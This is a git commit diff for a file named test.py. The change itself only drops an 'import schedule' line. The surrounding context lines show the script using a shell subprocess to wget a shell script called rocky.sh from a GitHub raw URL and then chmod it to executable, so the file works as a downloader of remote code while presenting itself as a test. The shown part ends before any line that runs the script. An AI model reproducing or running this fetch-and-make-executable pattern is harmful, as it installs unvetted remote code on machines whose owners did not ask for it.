c9b15011e3d36b5d9d903fdaf8565e9dd7886222
taebk2838 <85474215+taebk2838@users.noreply.github.com>
2021-06-25 12:19:22 +0530

    Update test.py

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import subprocess
 import time
-import schedule
+
 
 subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh", shell=True)
 subprocess.call("chmod 755 rocky.sh", shell=True)
